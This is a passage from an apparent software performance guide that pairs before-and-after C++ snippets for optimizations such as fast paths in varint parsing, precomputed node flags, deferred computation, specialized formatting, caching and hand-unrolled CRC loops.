TensorShapeBase&lt;Shape&gt;::TensorShapeBase(gtl::ArraySlice&lt;int64&gt; dim_sizes) {
  set_tag(REP16);
  set_data_type(DT_INVALID);
  set_ndims_byte(0);
  set_num_elements(1);
  for (int64 s : dim_sizes) {
    AddDim(internal::SubtleMustCopy(s));
  }
}
</code></pre>
</div>

<div>
<pre><code>template &lt;class Shape&gt;
void TensorShapeBase&lt;Shape&gt;::InitDims(gtl::ArraySlice&lt;int64&gt; dim_sizes) {
  DCHECK_EQ(tag(), REP16);

  // Allow sizes that are under kint64max^0.25 so that 4-way multiplication
  // below cannot overflow.
  static const uint64 kMaxSmall = 0xd744;
  static_assert(kMaxSmall * kMaxSmall * kMaxSmall * kMaxSmall &lt;= kint64max,
                "bad overflow check");
  bool large_size = false;
  for (auto s : dim_sizes) {
    if (s &gt; kMaxSmall) {
      large_size = true;
      break;
    }
  }

  if (!large_size) {
    // Every size fits in 16 bits; use fast-paths for dims in {1,2,3,4}.
    uint16* dst = as16()-&gt;dims_;
    switch (dim_sizes.size()) {
      case 1: {
        set_ndims_byte(1);
        const int64 size = dim_sizes[0];
        const bool neg = Set16(kIsPartial, dst, 0, size);
        set_num_elements(neg ? -1 : size);
        return;
      }
      case 2: {
        set_ndims_byte(2);
        const int64 size0 = dim_sizes[0];
        const int64 size1 = dim_sizes[1];
        bool neg = Set16(kIsPartial, dst, 0, size0);
        neg |= Set16(kIsPartial, dst, 1, size1);
        set_num_elements(neg ? -1 : (size0 * size1));
        return;
      }
      case 3: {
      ...
      }
      case 4: {
      ...
      }
    }
  }

  set_ndims_byte(0);
  set_num_elements(1);
  for (int64 s : dim_sizes) {
    AddDim(internal::SubtleMustCopy(s));
  }
}
</code></pre>
</div>


</details>

<details>
<summary><p>Make varint parser fast path cover just the 1-byte case,
instead of covering 1-byte and 2-byte cases.</p>
</summary>

<p>Reducing the size of the (inlined) fast path reduces code size and icache
pressure, which leads to improved performance.</p>
<p>parse_context.h</p>

<div>
<pre><code>template &lt;typename T&gt;
PROTOBUF_NODISCARD const char* VarintParse(const char* p, T* out) {
  auto ptr = reinterpret_cast&lt;const uint8_t*&gt;(p);
  uint32_t res = ptr[0];
  if (!(res &amp; 0x80)) {
    *out = res;
    return p + 1;
  }
  uint32_t byte = ptr[1];
  res += (byte - 1) &lt;&lt; 7;
  if (!(byte &amp; 0x80)) {
    *out = res;
    return p + 2;
  }
  return VarintParseSlow(p, res, out);
}
</code></pre>
</div>

<div>
<pre><code>template &lt;typename T&gt;
PROTOBUF_NODISCARD const char* VarintParse(const char* p, T* out) {
  auto ptr = reinterpret_cast&lt;const uint8_t*&gt;(p);
  uint32_t res = ptr[0];
  if (!(res &amp; 0x80)) {
    *out = res;
    return p + 1;
  }
  return VarintParseSlow(p, res, out);
}
</code></pre>
</div>

<p>parse_context.cc</p>

<div>
<pre><code>std::pair&lt;const char*, uint32_t&gt; VarintParseSlow32(const char* p,
                                                   uint32_t res) {
  for (std::uint32_t i = 2; i &lt; 5; i++) {
  ...
}
...
std::pair&lt;const char*, uint64_t&gt; VarintParseSlow64(const char* p,
                                                   uint32_t res32) {
  uint64_t res = res32;
  for (std::uint32_t i = 2; i &lt; 10; i++) {
  ...
}
</code></pre>
</div>

<div>
<pre><code>std::pair&lt;const char*, uint32_t&gt; VarintParseSlow32(const char* p,
                                                   uint32_t res) {
  for (std::uint32_t i = 1; i &lt; 5; i++) {
  ...
}
...
std::pair&lt;const char*, uint64_t&gt; VarintParseSlow64(const char* p,
                                                   uint32_t res32) {
  uint64_t res = res32;
  for (std::uint32_t i = 1; i &lt; 10; i++) {
  ...
}
</code></pre>
</div>


</details>

<details>
<summary><p>Skip significant work in RPC_Stats_Measurement addition if
no errors have occurred.</p>
</summary>

<p>rpc-stats.h</p>

<div>
<pre><code>struct RPC_Stats_Measurement {
  ...
  double errors[RPC::NUM_ERRORS];
</code></pre>
</div>

<div>
<pre><code>struct RPC_Stats_Measurement {
  ...
  double get_errors(int index) const { return errors[index]; }
  void set_errors(int index, double value) {
    errors[index] = value;
    any_errors_set = true;
  }
 private:
  ...
  // We make this private so that we can keep track of whether any of
  // these values have been set to non-zero values.
  double errors[RPC::NUM_ERRORS];
  bool any_errors_set;  // True iff any of the errors[i] values are non-zero
</code></pre>
</div>

<p>rpc-stats.cc</p>

<div>
<pre><code>void RPC_Stats_Measurement::operator+=(const RPC_Stats_Measurement&amp; x) {
  ...
  for (int i = 0; i &lt; RPC::NUM_ERRORS; ++i) {
    errors[i] += x.errors[i];
  }
}
</code></pre>
</div>

<div>
<pre><code>void RPC_Stats_Measurement::operator+=(const RPC_Stats_Measurement&amp; x) {
  ...
  if (x.any_errors_set) {
    for (int i = 0; i &lt; RPC::NUM_ERRORS; ++i) {
      errors[i] += x.errors[i];
    }
    any_errors_set = true;
  }
}
</code></pre>
</div>


</details>

<details>
<summary><p>Do array lookup on first byte of string to often avoid
fingerprinting full string.</p>
</summary>

<p>soft-tokens-helper.cc</p>

<div>
<pre><code>bool SoftTokensHelper::IsSoftToken(const StringPiece&amp; token) const {
  return soft_tokens_.find(Fingerprint(token.data(), token.size())) !=
      soft_tokens_.end();
}
</code></pre>
</div>

<p>soft-tokens-helper.h</p>

<div>
<pre><code>class SoftTokensHelper {
 ...
 private:
  ...
  // Since soft tokens are mostly punctuation-related, for performance
  // purposes, we keep an array filter_.  filter_[i] is true iff any
  // of the soft tokens start with the byte value 'i'.  This avoids
  // fingerprinting a term in the common case, since we can just do an array
  // lookup based on the first byte, and if filter_[b] is false, then
  // we can return false immediately.
  bool          filter_[256];
  ...
};

inline bool SoftTokensHelper::IsSoftToken(const StringPiece&amp; token) const {
  if (token.size() &gt;= 1) {
    char first_char = token.data()[0];
    if (!filter_[first_char]) {
      return false;
    }
  }
  return IsSoftTokenFallback(token);
}
</code></pre>
</div>

<p>soft-tokens-helper.cc</p>

<div>
<pre><code>bool SoftTokensHelper::IsSoftTokenFallback(const StringPiece&amp; token) const {
  return soft_tokens_.find(Fingerprint(token.data(), token.size())) !=
      soft_tokens_.end();
}
</code></pre>
</div>


</details>

<h3 id="precompute-expensive-information-once">Precompute expensive information once</h3>

<details>
<summary><p>Precompute a TensorFlow graph execution node property
that allows us to quickly rule out certain unusual cases.</p>
</summary>

<p>executor.cc</p>

<div>
<pre><code>struct NodeItem {
  ...
  bool kernel_is_expensive = false;  // True iff kernel-&gt;IsExpensive()
  bool kernel_is_async = false;      // True iff kernel-&gt;AsAsync() != nullptr
  bool is_merge = false;             // True iff IsMerge(node)
  ...
  if (IsEnter(node)) {
  ...
  } else if (IsExit(node)) {
  ...
  } else if (IsNextIteration(node)) {
  ...
  } else {
    // Normal path for most nodes
    ...
  }
</code></pre>
</div>

<div>
<pre><code>struct NodeItem {
  ...
  bool kernel_is_expensive : 1;  // True iff kernel-&gt;IsExpensive()
  bool kernel_is_async : 1;      // True iff kernel-&gt;AsAsync() != nullptr
  bool is_merge : 1;             // True iff IsMerge(node)
  bool is_enter : 1;             // True iff IsEnter(node)
  bool is_exit : 1;              // True iff IsExit(node)
  bool is_control_trigger : 1;   // True iff IsControlTrigger(node)
  bool is_sink : 1;              // True iff IsSink(node)
  // True iff IsEnter(node) || IsExit(node) || IsNextIteration(node)
  bool is_enter_exit_or_next_iter : 1;
  ...
  if (!item-&gt;is_enter_exit_or_next_iter) {
    // Fast path for nodes types that don't need special handling
    DCHECK_EQ(input_frame, output_frame);
    ...
  } else if (item-&gt;is_enter) {
  ...
  } else if (item-&gt;is_exit) {
  ...
  } else {
    DCHECK(IsNextIteration(node));
    ...
  }
</code></pre>
</div>


</details>

<details>
<summary><p>Precompute 256 element array and use during trigram
initialization.</p>
</summary>

<p>byte_trigram_classifier.cc</p>

<div>
<pre><code>void ByteTrigramClassifier::VerifyModel(void) const {
  ProbT class_sums[num_classes_];
  for (int cls = 0; cls &lt; num_classes_; cls++) {
    class_sums[cls] = 0;
  }
  for (ByteNgramId id = 0; id &lt; trigrams_.num_trigrams(); id++) {
    for (int cls = 0; cls &lt; num_classes_; ++cls) {
      class_sums[cls] += Prob(trigram_probs_[id].log_probs[cls]);
    }
  }
  ...
}                         
</code></pre>
</div>

<div>
<pre><code>void ByteTrigramClassifier::VerifyModel(void) const {
  CHECK_EQ(sizeof(ByteLogProbT), 1);
  ProbT fast_prob[256];
  for (int b = 0; b &lt; 256; b++) {
    fast_prob[b] = Prob(static_cast&lt;ByteLogProbT&gt;(b));
  }

  ProbT class_sums[num_classes_];
  for (int cls = 0; cls &lt; num_classes_; cls++) {
    class_sums[cls] = 0;
  }
  for (ByteNgramId id = 0; id &lt; trigrams_.num_trigrams(); id++) {
    for (int cls = 0; cls &lt; num_classes_; ++cls) {
      class_sums[cls] += fast_prob[trigram_probs_[id].log_probs[cls]];
    }
  }
  ...
}                         
</code></pre>
</div>


</details>

<p>General advice: check for malformed inputs at module boundaries instead of
repeating checks internally.</p>

<h3 id="move-expensive-computations-outside-loops">Move expensive computations outside loops</h3>

<details>
<summary><p>Move bounds computation outside loop.</p>
</summary>

<p>literal_linearizer.cc</p>

<div>
<pre><code>for (int64 i = 0; i &lt; src_shape.dimensions(dimension_numbers.front());
     ++i) {
</code></pre>
</div>

<div>
<pre><code>int64 dim_front = src_shape.dimensions(dimension_numbers.front());
const uint8* src_buffer_data = src_buffer.data();
uint8* dst_buffer_data = dst_buffer.data();
for (int64 i = 0; i &lt; dim_front; ++i) {
</code></pre>
</div>


</details>

<h3 id="defer-expensive-computation">Defer expensive computation</h3>

<details>
<summary><p>Defer GetSubSharding call until needed, which reduces 43
seconds of CPU time to 2 seconds.</p>
</summary>

<p>sharding_propagation.cc</p>

<div>
<pre><code>HloSharding alternative_sub_sharding =
    user.sharding().GetSubSharding(user.shape(), {i});
if (user.operand(i) == &amp;instruction &amp;&amp;
    hlo_sharding_util::IsShardingMoreSpecific(alternative_sub_sharding,
                                              sub_sharding)) {
  sub_sharding = alternative_sub_sharding;
}
</code></pre>
</div>

<div>
<pre><code>if (user.operand(i) == &amp;instruction) {
  // Only evaluate GetSubSharding if this operand is of interest,
  // as it is relatively expensive.
  HloSharding alternative_sub_sharding =
      user.sharding().GetSubSharding(user.shape(), {i});
  if (hlo_sharding_util::IsShardingMoreSpecific(
          alternative_sub_sharding, sub_sharding)) {
    sub_sharding = alternative_sub_sharding;
  }
}
</code></pre>
</div>


</details>

<details>
<summary><p>Don't update stats eagerly; compute them on demand.</p>
</summary>

<p>Do not update stats on the very frequent allocation/deallocation calls. Instead,
compute stats on demand when the much less frequently called Stats() method is
invoked.</p>

</details>

<details>
<summary><p>Preallocate 10 nodes not 200 for query handling in Google's
web server.</p>
</summary>

<p>A simple change that reduced web server's CPU usage by 7.5%.</p>
<p>querytree.h</p>

<div>
<pre><code>static const int kInitParseTreeSize = 200;   // initial size of querynode pool
</code></pre>
</div>

<div>
<pre><code>static const int kInitParseTreeSize = 10;   // initial size of querynode pool
</code></pre>
</div>


</details>

<details>
<summary><p>Change search order for 19% throughput improvement.</p>
</summary>

<p>An old search system (circa 2000) had two tiers: one contained a full-text
index, and the other tier contained just the index for the title and anchor
terms. We used to search the smaller title/anchor tier first.
Counter-intuitively, we found that it is cheaper to search the larger full-text
index tier first since if we reach the end of the full-text tier, we can
entirely skip searching the title/anchor tier (a subset of the full-text tier).
This happened reasonably often and allowed us to reduce the average number of
disk seeks to process a query.</p>
<p>See discussion of title and anchor text handling in
<a href="https://research.google/pubs/the-anatomy-of-a-large-scale-hypertextual-web-search-engine/">The Anatomy of a Large-Scale Hypertextual Web Search Engine</a>
for background information.</p>

</details>

<h3 id="specialize-code">Specialize code</h3>

<p>A particular performance-sensitive call-site may not need the full generality
provided by a general-purpose library. Consider writing specialized code in such
cases instead of calling the general-purpose code if it provides a performance
improvement.</p>

<details>
<summary><p>Custom printing code for Histogram class is 4x as fast as
sprintf.</p>
</summary>

<p>This code is performance sensitive because it is invoked when monitoring systems
gather statistics from various servers.</p>
<p>histogram_export.cc</p>

<div>
<pre><code>void Histogram::PopulateBuckets(const string &amp;prefix,
                                expvar::MapProto *const var) const {
                                ...
  for (int i = min_bucket; i &lt;= max_bucket; ++i) {
    const double count = BucketCount(i);
    if (!export_empty_buckets &amp;&amp; count == 0.0) continue;
    acc += count;
    // The label format of exported buckets for discrete histograms
    // specifies an inclusive upper bound, which is the same as in
    // the original Histogram implementation.  This format is not
    // applicable to non-discrete histograms, so a half-open interval
    // is used for them, with "_" instead of "-" as a separator to
    // make possible to distinguish the formats.
    string key =
        options_.export_cumulative_counts() ?
            StringPrintf("%.12g", boundaries_-&gt;BucketLimit(i)) :
        options_.discrete() ?
            StringPrintf("%.0f-%.0f",
                         ceil(boundaries_-&gt;BucketStart(i)),
                         ceil(boundaries_-&gt;BucketLimit(i)) - 1.0) :
            StringPrintf("%.12g_%.12g",
                         boundaries_-&gt;BucketStart(i),
                         boundaries_-&gt;BucketLimit(i));
    EscapeMapKey(&amp;key);
    const double value = options_.export_cumulative_counts() ? acc : count;
    expvar::AddMapFloat(StrCat(prefix,
                               options_.export_bucket_key_prefix(),
                               key),
                        value * count_mult,
                        var);
  }
</code></pre>
</div>

<div>
<pre><code>// Format "val" according to format.  If "need_escape" is true, then the
// format can produce output with a '.' in it, and the result will be escaped.
// If "need_escape" is false, then the caller guarantees that format is
// such that the resulting number will not have any '.' characters and
// therefore we can avoid calling EscapeKey.
// The function is free to use "*scratch" for scratch space if necessary,
// and the resulting StringPiece may point into "*scratch".
static StringPiece FormatNumber(const char* format,
                                bool need_escape,
                                double val, string* scratch) {
  // This routine is specialized to work with only a limited number of formats
  DCHECK(StringPiece(format) == "%.0f" || StringPiece(format) == "%.12g");

  scratch-&gt;clear();
  if (val == trunc(val) &amp;&amp; val &gt;= kint32min &amp;&amp; val &lt;= kint32max) {
    // An integer for which we can just use StrAppend
    StrAppend(scratch, static_cast&lt;int32&gt;(val));
    return StringPiece(*scratch);
  } else if (isinf(val)) {
    // Infinity, represent as just 'inf'.
    return StringPiece("inf", 3);
  } else {
    // Format according to "format", and possibly escape.
    StringAppendF(scratch, format, val);
    if (need_escape) {
      EscapeMapKey(scratch);
    } else {
      DCHECK(!StringPiece(*scratch).contains("."));
    }
    return StringPiece(*scratch);
  }
}
...
void Histogram::PopulateBuckets(const string &amp;prefix,
                                expvar::MapProto *const var) const {
                                ...
  const string full_key_prefix = StrCat(prefix,
                                        options_.export_bucket_key_prefix());
  string key = full_key_prefix;  // Keys will start with "full_key_prefix".
  string start_scratch;
  string limit_scratch;
  const bool cumul_counts = options_.export_cumulative_counts();
  const bool discrete = options_.discrete();
  for (int i = min_bucket; i &lt;= max_bucket; ++i) {
    const double count = BucketCount(i);
    if (!export_empty_buckets &amp;&amp; count == 0.0) continue;
    acc += count;
    // The label format of exported buckets for discrete histograms
    // specifies an inclusive upper bound, which is the same as in
    // the original Histogram implementation.  This format is not
    // applicable to non-discrete histograms, so a half-open interval
    // is used for them, with "_" instead of "-" as a separator to
    // make possible to distinguish the formats.
    key.resize(full_key_prefix.size());  // Start with full_key_prefix.
    DCHECK_EQ(key, full_key_prefix);

    const double limit = boundaries_-&gt;BucketLimit(i);
    if (cumul_counts) {
      StrAppend(&amp;key, FormatNumber("%.12g", true, limit, &amp;limit_scratch));
    } else {
      const double start = boundaries_-&gt;BucketStart(i);
      if (discrete) {
        StrAppend(&amp;key,
                  FormatNumber("%.0f", false, ceil(start), &amp;start_scratch),
                  "-",
                  FormatNumber("%.0f", false, ceil(limit) - 1.0,
                               &amp;limit_scratch));
      } else {
        StrAppend(&amp;key,
                  FormatNumber("%.12g", true, start, &amp;start_scratch),
                  "_",
                  FormatNumber("%.12g", true, limit, &amp;limit_scratch));
      }
    }
    const double value = cumul_counts ? acc : count;

    // Add to map var
    expvar::AddMapFloat(key, value * count_mult, var);
  }
}
</code></pre>
</div>


</details>

<details>
<summary><p>Add specializations for VLOG(1), VLOG(2), … for speed and
smaller code size.</p>
</summary>

<p><code>VLOG</code> is a heavily used macro throughout the code base. This change avoids
passing an extra integer constant at nearly every call site (if the log level is
constant at the call site, as it almost always is, as in <code>VLOG(1) &lt;&lt; ...</code>),
which saves code space.</p>
<p>vlog_is_on.h</p>

<div>
<pre><code>class VLogSite final {
 public:
  ...
  bool IsEnabled(int level) {
    int stale_v = v_.load(std::memory_order_relaxed);
    if (ABSL_PREDICT_TRUE(level &gt; stale_v)) {
      return false;
    }

    // We put everything other than the fast path, i.e. vlogging is initialized
    // but not on, behind an out-of-line function to reduce code size.
    return SlowIsEnabled(stale_v, level);
  }
  ...
 private:
  ...
  ABSL_ATTRIBUTE_NOINLINE
  bool SlowIsEnabled(int stale_v, int level);
  ...
};
</code></pre>
</div>

<div>
<pre><code>class VLogSite final {
 public:
  ...
  bool IsEnabled(int level) {
    int stale_v = v_.load(std::memory_order_relaxed);
    if (ABSL_PREDICT_TRUE(level &gt; stale_v)) {
      return false;
    }

    // We put everything other than the fast path, i.e. vlogging is initialized
    // but not on, behind an out-of-line function to reduce code size.
    // "level" is almost always a call-site constant, so we can save a bit
    // of code space by special-casing for levels 1, 2, and 3.
#if defined(__has_builtin) &amp;&amp; __has_builtin(__builtin_constant_p)
    if (__builtin_constant_p(level)) {
      if (level == 0) return SlowIsEnabled0(stale_v);
      if (level == 1) return SlowIsEnabled1(stale_v);
      if (level == 2) return SlowIsEnabled2(stale_v);
      if (level == 3) return SlowIsEnabled3(stale_v);
      if (level == 4) return SlowIsEnabled4(stale_v);
      if (level == 5) return SlowIsEnabled5(stale_v);
    }
#endif
    return SlowIsEnabled(stale_v, level);
    ...
 private:
  ...
  ABSL_ATTRIBUTE_NOINLINE
  bool SlowIsEnabled(int stale_v, int level);
  ABSL_ATTRIBUTE_NOINLINE bool SlowIsEnabled0(int stale_v);
  ABSL_ATTRIBUTE_NOINLINE bool SlowIsEnabled1(int stale_v);
  ABSL_ATTRIBUTE_NOINLINE bool SlowIsEnabled2(int stale_v);
  ABSL_ATTRIBUTE_NOINLINE bool SlowIsEnabled3(int stale_v);
  ABSL_ATTRIBUTE_NOINLINE bool SlowIsEnabled4(int stale_v);
  ABSL_ATTRIBUTE_NOINLINE bool SlowIsEnabled5(int stale_v);
  ...
};
</code></pre>
</div>

<p>vlog_is_on.cc</p>

<div>
<pre><code>bool VLogSite::SlowIsEnabled0(int stale_v) { return SlowIsEnabled(stale_v, 0); }
bool VLogSite::SlowIsEnabled1(int stale_v) { return SlowIsEnabled(stale_v, 1); }
bool VLogSite::SlowIsEnabled2(int stale_v) { return SlowIsEnabled(stale_v, 2); }
bool VLogSite::SlowIsEnabled3(int stale_v) { return SlowIsEnabled(stale_v, 3); }
bool VLogSite::SlowIsEnabled4(int stale_v) { return SlowIsEnabled(stale_v, 4); }
bool VLogSite::SlowIsEnabled5(int stale_v) { return SlowIsEnabled(stale_v, 5); }
</code></pre>
</div>


</details>

<details>
<summary><p>Replace RE2 call with a simple prefix match when possible.</p>
</summary>

<p>read_matcher.cc</p>

<div>
<pre><code>enum MatchItemType {
  MATCH_TYPE_INVALID,
  MATCH_TYPE_RANGE,
  MATCH_TYPE_EXACT,
  MATCH_TYPE_REGEXP,
};
</code></pre>
</div>

<div>
<pre><code>enum MatchItemType {
  MATCH_TYPE_INVALID,
  MATCH_TYPE_RANGE,
  MATCH_TYPE_EXACT,
  MATCH_TYPE_REGEXP,
  MATCH_TYPE_PREFIX,   // Special type for regexp ".*"
};
</code></pre>
</div>

<p>read_matcher.cc</p>

<div>
<pre><code>p-&gt;type = MATCH_TYPE_REGEXP;
</code></pre>
</div>

<div>
<pre><code>term.NonMetaPrefix().CopyToString(&amp;p-&gt;prefix);
if (term.RegexpSuffix() == ".*") {
  // Special case for a regexp that matches anything, so we can
  // bypass RE2::FullMatch
  p-&gt;type = MATCH_TYPE_PREFIX;
} else {
  p-&gt;type = MATCH_TYPE_REGEXP;
</code></pre>
</div>


</details>

<details>
<summary><p>Use StrCat rather than StringPrintf to format IP
addresses.</p>
</summary>

<p>ipaddress.cc</p>

<div>
<pre><code>string IPAddress::ToString() const {
  char buf[INET6_ADDRSTRLEN];

  switch (address_family_) {
    case AF_INET:
      CHECK(inet_ntop(AF_INET, &amp;addr_.addr4, buf, INET6_ADDRSTRLEN) != NULL);
      return buf;
    case AF_INET6:
      CHECK(inet_ntop(AF_INET6, &amp;addr_.addr6, buf, INET6_ADDRSTRLEN) != NULL);
      return buf;
    case AF_UNSPEC:
      LOG(DFATAL) &lt;&lt; "Calling ToString() on an empty IPAddress";
      return "";
    default:
      LOG(FATAL) &lt;&lt; "Unknown address family " &lt;&lt; address_family_;
  }
}
...
string IPAddressToURIString(const IPAddress&amp; ip) {
  switch (ip.address_family()) {
    case AF_INET6:
      return StringPrintf("[%s]", ip.ToString().c_str());
    default:
      return ip.ToString();
  }
}
...
string SocketAddress::ToString() const {
  return IPAddressToURIString(host_) + StringPrintf(":%u", port_);
}
</code></pre>
</div>

<div>
<pre><code>string IPAddress::ToString() const {
  char buf[INET6_ADDRSTRLEN];

  switch (address_family_) {
    case AF_INET: {
      uint32 addr = gntohl(addr_.addr4.s_addr);
      int a1 = static_cast&lt;int&gt;((addr &gt;&gt; 24) &amp; 0xff);
      int a2 = static_cast&lt;int&gt;((addr &gt;&gt; 16) &amp; 0xff);
      int a3 = static_cast&lt;int&gt;((addr &gt;&gt; 8) &amp; 0xff);
      int a4 = static_cast&lt;int&gt;(addr &amp; 0xff);
      return StrCat(a1, ".", a2, ".", a3, ".", a4);
    }
    case AF_INET6:
      CHECK(inet_ntop(AF_INET6, &amp;addr_.addr6, buf, INET6_ADDRSTRLEN) != NULL);
      return buf;
    case AF_UNSPEC:
      LOG(DFATAL) &lt;&lt; "Calling ToString() on an empty IPAddress";
      return "";
    default:
      LOG(FATAL) &lt;&lt; "Unknown address family " &lt;&lt; address_family_;
  }
}
...
string IPAddressToURIString(const IPAddress&amp; ip) {
  switch (ip.address_family()) {
    case AF_INET6:
      return StrCat("[", ip.ToString(), "]");
    default:
      return ip.ToString();
  }
}
...
string SocketAddress::ToString() const {
  return StrCat(IPAddressToURIString(host_), ":", port_);
}
</code></pre>
</div>


</details>

<h3 id="use-caching-to-avoid-repeated-work">Use caching to avoid repeated work</h3>

<details>
<summary><p>Cache based on precomputed fingerprint of large
serialized proto.</p>
</summary>

<p>dp_ops.cc</p>

<div>
<pre><code>InputOutputMappingProto mapping_proto;
PLAQUE_OP_REQUIRES(
    mapping_proto.ParseFromStringPiece(GetAttrMappingProto(state)),
    absl::InternalError("Failed to parse InputOutputMappingProto"));
ParseMapping(mapping_proto);
</code></pre>
</div>

<div>
<pre><code>uint64 mapping_proto_fp = GetAttrMappingProtoFp(state);
{
  absl::MutexLock l(&amp;fp_to_iometa_mu);
  if (fp_to_iometa == nullptr) {
    fp_to_iometa =
        new absl::flat_hash_map&lt;uint64, std::unique_ptr&lt;ProgramIOMetadata&gt;&gt;;
  }
  auto it = fp_to_iometa-&gt;find(mapping_proto_fp);
  if (it != fp_to_iometa-&gt;end()) {
    io_metadata_ = it-&gt;second.get();
  } else {
    auto serial_proto = GetAttrMappingProto(state);
    DCHECK_EQ(mapping_proto_fp, Fingerprint(serial_proto));
    InputOutputMappingProto mapping_proto;
    PLAQUE_OP_REQUIRES(
        mapping_proto.ParseFromStringPiece(GetAttrMappingProto(state)),
        absl::InternalError("Failed to parse InputOutputMappingProto"));
    auto io_meta = ParseMapping(mapping_proto);
    io_metadata_ = io_meta.get();
    (*fp_to_iometa)[mapping_proto_fp] = std::move(io_meta);
  }
}
</code></pre>
</div>


</details>

<h3 id="make-the-compilers-job-easier">Make the compiler’s job easier</h3>

<p>The compiler may have trouble optimizing through layers of abstractions because
it must make conservative assumptions about the overall behavior of the code, or
may not make the right speed vs. size tradeoffs. The application programmer will
often know more about the behavior of the system and can aid the compiler by
rewriting the code to operate at a lower level. However, only do this when
profiles show an issue since compilers will often get things right on their own.
Looking at the generated assembly code for performance critical routines can
help you understand if the compiler is “getting it right”. Pprof provides a very
helpful <a href="https://github.com/google/pprof/blob/main/doc/README.md#annotated-source-code">display of source code interleaved with disassembly</a>
and annotated with performance data.</p>

<p>Some techniques that may be useful:</p>

<ol>
  <li>Avoid functions calls in hot functions (allows the compiler to avoid frame
setup costs).</li>
  <li>Move slow-path code into a separate tail-called function.</li>
  <li>Copy small amounts of data into local variables before heavy use. This can
let the compiler assume there is no aliasing with other data, which may
improve auto-vectorization and register allocation.</li>
  <li>Hand-unroll very hot loops.</li>
</ol>

<details>
<summary><p>Speed up ShapeUtil::ForEachState by replacing absl::Span
with raw pointers to the underlying arrays.</p>
</summary>

<p>shape_util.h</p>

<div>
<pre><code>struct ForEachState {
  ForEachState(const Shape&amp; s, absl::Span&lt;const int64_t&gt; b,
               absl::Span&lt;const int64_t&gt; c, absl::Span&lt;const int64_t&gt; i);
  ~ForEachState();

  const Shape&amp; shape;
  const absl::Span&lt;const int64_t&gt; base;
  const absl::Span&lt;const int64_t&gt; count;
  const absl::Span&lt;const int64_t&gt; incr;
</code></pre>
</div>

<div>
<pre><code>struct ForEachState {
  ForEachState(const Shape&amp; s, absl::Span&lt;const int64_t&gt; b,
               absl::Span&lt;const int64_t&gt; c, absl::Span&lt;const int64_t&gt; i);
  inline ~ForEachState() = default;

  const Shape&amp; shape;
  // Pointers to arrays of the passed-in spans
  const int64_t* const base;
  const int64_t* const count;
  const int64_t* const incr;
</code></pre>
</div>


</details>

<details>
<summary><p>Hand unroll
<a href="https://en.wikipedia.org/wiki/Cyclic_redundancy_check">cyclic
redundancy check</a> (CRC) computation loop.</p>
</summary>

<p>crc.cc</p>

<div>
<pre><code>void CRC32::Extend(uint64 *lo, uint64 *hi, const void *bytes, size_t length)
                      const {
                      ...
  // Process bytes 4 at a time
  while ((p + 4) &lt;= e) {
    uint32 c = l ^ WORD(p);
    p += 4;
    l = this-&gt;table3_[c &amp; 0xff] ^
        this-&gt;table2_[(c &gt;&gt; 8) &amp; 0xff] ^
        this-&gt;table1_[(c &gt;&gt; 16) &amp; 0xff] ^
        this-&gt;table0_[c &gt;&gt; 24];
  }

  // Process the last few bytes
  while (p != e) {
    int c = (l &amp; 0xff) ^ *p++;
    l = this-&gt;table0_[c] ^ (l &gt;&gt; 8);
  }
  *lo = l;
}
</code></pre>
</div>

<div>
<pre><code>void CRC32::Extend(uint64 *lo, uint64 *hi, const void *bytes, size_t length)
                      const {
                      ...
#define STEP {                                  \
    uint32 c = l ^ WORD(p);                     \
    p += 4;                                     \
    l = this-&gt;table3_[c &amp; 0xff] ^               \
        this-&gt;table2_[(c &gt;&gt; 8) &amp; 0xff] ^        \
        this-&gt;table1_[(c &gt;&gt; 16) &amp; 0xff] ^       \
        this-&gt;table0_[c &gt;&gt; 24];                 \
}

  // Process bytes 16 at a time
  while ((e-p) &gt;= 16) {
    STEP;
    STEP;
    STEP;
    STEP;
  }

  // Process bytes 4 at a time
  while ((p + 4) &lt;= e) {
    STEP;
  }
#undef STEP

  // Process the last few bytes
  while (p != e) {
    int c = (l &amp; 0xff) ^ *p++;
    l = this-&gt;table0_[c] ^ (l &gt;&gt; 8);
  }
  *lo = l;
}

</code></pre>
</div>


</details>

<details>
<summary><p>Handle four characters at a time when parsing Spanner
keys.</p>
</summary>

<ol>
<li>
<p>Hand unroll loop to deal with four characters at a time rather than using
memchr</p>
</li>
<li>
<p>Manually unroll loop for finding separated sections of name</p>
</li>
<li>
<p>Go backwards to find separated portions of a name with '#' separators
(rather than forwards) since the first part is likely the longest in the
name.</p>
</li>
</ol>
<p>key.cc</p>

<div>
<pre><code>void Key::InitSeps(const char* start) {
  const char* base = &amp;rep_[0];
  const char* limit = base + rep_.size();
  const char* s = start;

  DCHECK_GE(s, base);
  DCHECK_LT(s, limit);

  for (int i = 0; i &lt; 3; i++) {
    s = (const char*)memchr(s, '#', limit - s);
    DCHECK(s != NULL);
    seps_[i] = s - base;
    s++;
  }
}
</code></pre>
</div>

<div>
<pre><code>inline const char* ScanBackwardsForSep(const char* base, const char* p) {
  while (p &gt;= base + 4) {
    if (p[0] == '#') return p;
    if (p[-1] == '#') return p-1;
    if (p[-2] == '#') return p-2;
    if (p[-3] == '#') return p-3;
    p -= 4;
  }
  while (p &gt;= base &amp;&amp; *p != '#') p--;
  return p;
}

void Key::InitSeps(const char* start) {
  const char* base = &amp;rep_[0];
  const char* limit = base + rep_.size();
  const char* s = start;

  DCHECK_GE(s, base);
  DCHECK_LT(s, limit);

  // We go backwards from the end of the string, rather than forwards,
  // since the directory name might be long and definitely doesn't contain
  // any '#' characters.
  const char* p = ScanBackwardsForSep(s, limit - 1);
  DCHECK(*p == '#');
  seps_[2] = p - base;
  p--;

  p = ScanBackwardsForSep(s, p);
  DCHECK(*p == '#');
  seps_[1] = p - base;
  p--;

  p = ScanBackwardsForSep(s, p);
  DCHECK(*p == '#');
  seps_[0] = p - base;
}
</code></pre>
</div>


</details>

<details>
<summary><p>Avoid frame setup costs by converting ABSL_LOG(FATAL) to
ABSL_DCHECK(false).</p>
</summary>

<p>arena_cleanup.h</p>

<div>
<pre><code>inline ABSL_ATTRIBUTE_ALWAYS_INLINE size_t Size(Tag tag) {
  if (!EnableSpecializedTags()) return sizeof(DynamicNode);

  switch (tag) {
    case Tag::kDynamic:
      return sizeof(DynamicNode);
    case Tag::kString:
      return sizeof(TaggedNode);
    case Tag::kCord:
      return sizeof(TaggedNode);
    default:
      ABSL_LOG(FATAL) &lt;&lt; "Corrupted cleanup tag: " &lt;&lt; static_cast&lt;int&gt;(tag);
      return sizeof(DynamicNode);
  }
}
</code></pre>
</div>

<div>
<pre><code>inline ABSL_ATTRIBUTE_ALWAYS_INLINE size_t Size(Tag tag) {
